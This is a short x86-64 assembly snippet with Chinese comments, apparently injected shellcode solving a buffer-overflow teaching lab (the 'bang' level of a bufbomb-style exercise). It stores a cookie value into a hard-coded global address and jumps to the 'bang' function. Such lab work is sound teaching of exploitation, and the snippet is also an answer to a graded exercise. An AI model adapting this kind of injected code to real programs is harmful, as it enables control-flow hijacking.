section .text
global _start

_start:
    ; 将cookie值写入global_value (Intel语法)
    mov rax, 0xc109a39
    mov [0x403350], rax    ; 使用正确的global_value地址
    
    ; 跳转到bang函数
    mov rax, 0x401346      ; 使用正确的bang函数地址
    jmp rax